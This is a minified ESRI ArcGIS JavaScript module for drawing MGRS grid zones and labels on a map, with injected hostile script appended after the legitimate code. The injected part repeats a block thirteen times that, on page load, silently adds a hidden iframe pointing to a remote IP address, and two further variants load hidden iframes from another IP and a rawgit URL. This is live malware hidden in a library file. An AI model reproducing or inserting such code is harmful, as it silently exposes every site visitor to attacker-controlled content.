// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/json ./constants ./geometry-utils ./labeling-utils ./mgrs ./NonPolarGridZone ./VisibleGridZone ./GridPolygon esri/geometry/geometryEngine esri/graphic esri/geometry/Point esri/geometry/Polyline esri/geometry/Polygon esri/symbols/SimpleLineSymbol esri/symbols/TextSymbol esri/symbols/Font esri/Color".split(" "),function(J,u,w,C,v,P,Q,R,H,E,I,M,O,F,K,G,L){return{_ZonesDictionary:function(){var a,d,b,k="CDEFGHJKLMNPQRSTUVWX".split(""),h={};for(a=1;60>=a;a++)for(d=0;d<k.length;d++){var e=
b=b=void 0,m=void 0,w=void 0,f=a+k[d];"32X"===f||"34X"===f||"36X"===f?b=null:("31V"===f?b={xmin:0,ymin:56,xmax:3,ymax:64,id:f}:"32V"===f?b={xmin:3,ymin:56,xmax:12,ymax:64,id:f}:"31X"===f?b={xmin:0,ymin:72,xmax:9,ymax:84,id:f}:"33X"===f?b={xmin:9,ymin:72,xmax:21,ymax:84,id:f}:"35X"===f?b={xmin:21,ymin:72,xmax:33,ymax:84,id:f}:"37X"===f?b={xmin:33,ymin:72,xmax:42,ymax:84,id:f}:(b=(a-1)*u.ZONE_WIDTH_DEGREES-180,e=a*u.ZONE_WIDTH_DEGREES-180,m=d*u.ZONE_HEIGHT_DEGREES+u.MIN_MGRS_LATITUDE,w=(d+1)*u.ZONE_HEIGHT_DEGREES+
u.MIN_MGRS_LATITUDE,b=180===b?u.POSITIVE_180:b,b=-180===b?u.NEGATIVE_180:b,e=180===e?u.POSITIVE_180:e,e=-180===e?u.NEGATIVE_180:e,80===w&&(w=u.MAX_MGRS_LATITUDE),b={xmin:b,ymin:m,xmax:e,ymax:w,id:f}),b=new P(b));b&&(h[b.id]=b)}return h}(),getInterval:function(a,d,b){var k,h,e,m=0;k=d.getResolutionInMeters()*a;h=d.extent.getCenter();e=d.toMap(d.toScreen(h).offset(0,a/2));for(k=d.toMap(d.toScreen(h).offset(0,-a/2));84<=e.getLatitude()||84<=k.getLatitude();)m++,e=d.toMap(d.toScreen(h).offset(0,a/2+m*
a)),k=d.toMap(d.toScreen(h).offset(0,-a/2+m*a));for(;-80>=e.getLatitude()||-80>=k.getLatitude();)m++,e=d.toMap(d.toScreen(h).offset(0,a/2-m*a)),k=d.toMap(d.toScreen(h).offset(0,-a/2-m*a));a=e.getLatitude();d=e.getLongitude();e=k.getLatitude();m=k.getLongitude();k=v.getZoneNumber(a,d);k=Math.abs(v.LLtoUTM(a,d,k)[1]-v.LLtoUTM(e,m,k)[1]);a=Math.log10(k);switch(b){case "more":b=Math.floor(a);break;case "less":case "strict":b=Math.ceil(a);break;default:b=Math.round(a)}b=Math.pow(10,b);k>2*b&&(b*=10);return 1E5<
b?!1:b},zonesFromExtent:function(a){var d,b,k,h,e,m,v,f,q,z,n,g;b=a.map.extent;var r=b.spatialReference.isWebMercator()?u.WEBMERCATOR_360:u.GEOGRAPHIC_360,l={xOffset:a.getCornerLabelXOffset(),yOffset:a.getCornerLabelYOffset(),rotation:0,color:a.getColor(0),fontFamily:a.getFontFamily(),fontSize:a.getFontSize(0)},p="CDEFGHJKLMNPQRSTUVWX".split(""),t=[];if(b.xmax-b.xmin>r)return t;var r=w.extentToPolygon(b),r=w.toWebMercator(r),x=w.pointToGeographic(new I([b.xmin,b.ymin],b.spatialReference)),A=w.pointToGeographic(new I([b.xmax,
b.ymax],b.spatialReference));b=x.y;h=A.y;n=x.offsetX;g=A.offsetX;for(var y=n;y<=g;y++)for(d=y>n?u.NEGATIVE_180:x.x,k=y<g?u.POSITIVE_180:A.x,e=Math.min(Math.max(Math.floor((b+80)/u.ZONE_HEIGHT_DEGREES),0),19),m=Math.min(Math.floor((h+80)/u.ZONE_HEIGHT_DEGREES),19),d=Math.floor((d+180)/u.ZONE_WIDTH_DEGREES),k=Math.min(Math.floor((k+180)/u.ZONE_WIDTH_DEGREES)+2,60);d<=k;d++)for(var D=e;D<=m;D++)if(v=p[D],v=d+v,this._ZonesDictionary[v]){f=J.parse(J.stringify(this._ZonesDictionary[v]._rings));for(q=0;q<
f[0].length;q++)f[0][q][0]+=y*u.GEOGRAPHIC_360;q=new O({rings:f});z=new M({paths:f});if(f=H.intersect(w.toWebMercator(q),r))q=H.intersect(w.toWebMercator(z),r),t.push(new Q({map:a.map,polyline:q,polygon:f,offset:y,nonPolarGridZone:this._ZonesDictionary[v],labelParameters:l}))}return t},processZonePolygons:function(a,d){for(var b={},k=d.getInterval(),h=0;h<a.length;h++){var e=a[h];e&&(this.handleZonePolygon(e,d),k&&(b[e.nonPolarGridZone.utmZone]?b[e.nonPolarGridZone.utmZone].polygon=H.union([w.toWebMercator(e.polygon),
b[e.nonPolarGridZone.utmZone].polygon]):b[e.nonPolarGridZone.utmZone]={polygon:w.toWebMercator(e.polygon),offset:e.offset}))}if(k)for(a=Object.keys(b),h=0;h<a.length;h++){var e=a[h],m=b[e].polygon,u=b[e].offset,f=w.toGeographic(m.getExtent()),q=v.LLtoUTM(f.ymin,f.xmin,e),z=v.LLtoUTM(f.ymin,f.xmax,e),n=v.LLtoUTM(f.ymax,f.xmax,e),f=v.LLtoUTM(f.ymax,f.xmin,e),e={minE:Math.min(q[0],z[0],n[0],f[0]),maxE:Math.max(q[0],z[0],n[0],f[0]),minN:Math.min(q[1],z[1],n[1],f[1]),maxN:Math.max(q[1],z[1],n[1],f[1]),
utmZone:e,polygon:m,offset:u,grid:d};this.handle100kGrids(e);1E5>k&&this.handleIntervals(e)}},handleZonePolygon:function(a,d){var b,k,h;b=a.polyline;k=d.getColor(0);h=d.getLineWidth(0);d._lineGraphics0.push(new E(b,new F(F.STYLE_SOLID,new L(k),h)));if(!(4>d.map.getZoom()))if(5>=d.map.getZoom())d._labelGraphics.push(a.getCenterLabel());else for(a=a.getLabels(),b=0;b<a.length;b++)d._labelGraphics.push(a[b])},handle100kGrids:function(a){var d=a.polygon,b=a.offset,k=a.utmZone,h=a.minE,e=a.maxE,m=a.minN,
C=a.maxN;a=a.grid;for(var f=a.getColor(1),q=a.getLineWidth(1),z=a.getMap(),n,g,r,l,p,m=1E5*Math.floor(m/1E5);m<C;m+=1E5)for(n=1E5*Math.floor(h/1E5);n<e;n+=1E5){p=v.findGridLetters(k,0>m+5E4?1E7+(m+5E4):m+5E4,n+5E4);r=[];for(g=n;g<=n+1E5;g+=1E4)l=v.UTMtoLL(m,g,k),r.push([l.lon,l.lat]);for(g=m;g<m+1E5;g+=1E4)l=v.UTMtoLL(g,n+1E5,k),r.push([l.lon,l.lat]);for(g=n+1E5;g>=n;g-=1E4)l=v.UTMtoLL(m+1E5,g,k),r.push([l.lon,l.lat]);for(g=m+1E5;g>=m;g-=1E4)l=v.UTMtoLL(g,n,k),r.push([l.lon,l.lat]);for(g=0;g<r.length;g++)r[g][0]+=
b*u.GEOGRAPHIC_360;r=new O([r]);g=w.polygonToPolyline(r);l=H.intersect(w.toWebMercator(r),w.toWebMercator(d));g=H.intersect(w.toWebMercator(g),w.toWebMercator(d));if(l&&(p={clippedPolygon:l,unclippedPolygon:r,map:z,xmin:n%1E6,ymin:m%1E6,xmax:(n+1E5)%1E6,ymax:(m+1E5)%1E6,minMaxType:"utm",utmZone:k,text:p,labelParameters:{xOffset:10,yOffset:10,rotation:0,color:a.getColor(1),fontFamily:a.getFontFamily(),fontSize:a.getFontSize(1)}},p=new R(p),!(7>a.map.getZoom())))for(p=9>z.getZoom()?[p.getCenterLabel(!0)]:
p.getLabels(),g&&a._lineGraphics1.push(new E(g,new F(F.STYLE_SOLID,new L(f),q))),g=0;g<p.length;g++)a._labelGraphics.push(p[g])}},handleIntervals:function(a){var d=a.polygon,b=a.utmZone,k=a.offset,h=a.minE,e=a.maxE,m=a.minN,J=a.maxN;a=a.grid;var f=a.getFontFamily(),q=a.getIntervalLabelXOffset(),z=a.getIntervalLabelYOffset(),n=a.getInterval(),g=a.getMap(),r=a.getVerticalLabels(),l,p,t,x,A,y,D,B,c,N;for(l=Math.floor(m/n)*n;l<=J;l+=n)if(0!==l%1E5){0===l%1E4?(t=2,x=a._lineGraphics2):0===l%1E3?(t=3,x=
a._lineGraphics3):0===l%100?(t=4,x=a._lineGraphics4):(t=5,x=a._lineGraphics5);A=a.getColor(t);y=a.getLineWidth(t);t=a.getFontSize(t);D=new G(t,G.STYLE_NORMAL,G.VARIANT_NORMAL,G.WEIGHT_BOLD,f);c=[];p=v.UTMtoLL(l,h,b);B=v.UTMtoLL(l,e,b);for(p=0;p<e;p+=1E4)N=v.UTMtoLL(l,h+p,b),c.push([N.lon,N.lat]);c.push([B.lon,B.lat]);for(p=0;p<c.length;p++)c[p][0]+=k*u.GEOGRAPHIC_360;if(B=H.intersect(w.toWebMercator(new M([c])),w.toWebMercator(d))){y=new E(B,new F(F.STYLE_SOLID,new L(A),y));x.push(y);x=C.padZero((0>
m?1E7+l:l)%1E5/n,5-Math.log10(n));c=B.paths[0];p=new I({x:c[0][0]+.001,y:c[0][1],spatialReference:B.spatialReference});B=new I({x:c[c.length-1][0]-.001,y:c[c.length-1][1],spatialReference:B.spatialReference});y=C.screenDistanceBetweenPoints(p,B,g).horizontal;c=C.distanceFromMapEdge(p,g).horizontal;if(2>c||200<c&&300<y)c=(new K(x)).setAngle(0).setColor(A).setOffset(q,-(t/1.333)/2).setAlign("start").setFont(D),c=new E(p,c),a._labelGraphics.push(c);c=C.distanceFromMapEdge(B,g).horizontal;if(2>c||200<
c&&300<y)c=(new K(x)).setAngle(0).setColor(A).setOffset(-q,-(t/1.333)/2).setAlign("end").setFont(D),c=new E(B,c),a._labelGraphics.push(c)}}for(h=Math.floor(h/n)*n;h<=e;h+=n)if(0!==h%1E5){0===h%1E4?(t=2,x=a._lineGraphics2):0===h%1E3?(t=3,x=a._lineGraphics3):0===h%100?(t=4,x=a._lineGraphics4):(t=5,x=a._lineGraphics5);A=a.getColor(t);y=a.getLineWidth(t);t=a.getFontSize(t);D=new G(t,G.STYLE_NORMAL,G.VARIANT_NORMAL,G.WEIGHT_BOLD,f);c=[];l=v.UTMtoLL(m-1E4,h,b);q=v.UTMtoLL(J+1E4,h,b);c.push([l.lon,l.lat]);
c.push([q.lon,q.lat]);for(p=0;p<c.length;p++)c[p][0]+=k*u.GEOGRAPHIC_360;if(q=H.intersect(w.toWebMercator(new M([c])),w.toWebMercator(d))){l=new E(q,new F(F.STYLE_SOLID,new L(A),y));x.push(l);x=C.padZero(h%1E5/n,5-Math.log10(n));c=q.paths[0];l=new I({x:c[0][0],y:c[0][1]+.001,spatialReference:{wkid:102100}});q=new I({x:c[c.length-1][0],y:c[c.length-1][1]-.001,spatialReference:{wkid:102100}});y=C.screenDistanceBetweenPoints(l,q,g).vertical;c=C.distanceFromMapEdge(l,g).vertical;if(2>c||200<c&&300<y)c=
(new K(x)).setAngle(r?90:0).setColor(A).setOffset(r?-(t/1.333)/2:0,z).setAlign(r?"end":"middle").setFont(D),c=new E(l,c),a._labelGraphics.push(c);c=C.distanceFromMapEdge(q,g).vertical;if(2>c||200<c&&300<y)c=(new K(x)).setAngle(r?90:0).setColor(A).setOffset(r?-(t/1.333)/2:0,r?-z:-z-t/1.333).setAlign(r?"start":"middle").setFont(D),c=new E(q,c),a._labelGraphics.push(c)}}}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});